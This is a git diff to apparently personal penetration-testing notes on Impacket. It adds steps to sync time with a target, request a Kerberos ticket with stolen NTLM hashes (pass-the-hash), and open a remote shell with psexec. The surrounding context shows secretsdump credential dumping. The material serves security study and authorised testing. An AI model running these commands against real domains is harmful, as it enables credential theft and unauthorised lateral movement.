@@ -277,11 +277,16 @@ impacket-secretsdump <username>:<password>@<domain or IP> -dc-ip <DOMAINCONTROL 
 [getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py): get a Kerberos ticket and use it to access other services
 
 ```shell
+# synchronize with server time
+sudo ntpdate <target ip>
+#
 getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<user>
 # Kerberos credentials cache
 export KRB5CCNAME=<username>@<domain>.ccache
 # showing Kerberos credentials cache
 klist
+# login
+python3 psexec.py -k -no-pass <target>
 ```
 
 [reg.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py): remote registry manipulation tool through the ```MS-RRP``` [(Windows Remote Registry Protocol)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)
